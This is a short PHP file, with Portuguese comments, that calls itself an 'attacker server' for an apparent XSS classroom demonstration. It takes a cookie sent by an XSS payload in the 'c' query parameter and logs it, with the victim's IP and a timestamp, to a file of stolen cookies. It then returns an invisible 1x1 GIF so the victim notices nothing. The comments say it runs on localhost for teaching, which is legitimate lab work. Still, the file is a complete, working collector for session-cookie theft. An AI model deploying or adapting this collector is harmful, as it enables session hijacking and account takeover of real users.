<?php
// ===============================================================
//  "SERVIDOR DO ATACANTE" (apenas para demonstração do bônus)
//  Recebe o cookie roubado por um payload XSS e grava em arquivo.
//  Em um ataque real, isso estaria em OUTRO servidor, controlado
//  pelo atacante. Aqui fica no localhost só para a demonstração.
// ===============================================================

$cookie = $_GET['c'] ?? '(vazio)';
$ip     = $_SERVER['REMOTE_ADDR'] ?? '?';
$quando = date('Y-m-d H:i:s');

// Grava o cookie capturado em um arquivo de log
file_put_contents(
    __DIR__ . '/cookies_roubados.txt',
    "[$quando] IP=$ip  COOKIE=$cookie\n",
    FILE_APPEND
);

// Responde com uma imagem transparente 1x1 (fica invisível na vítima)
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
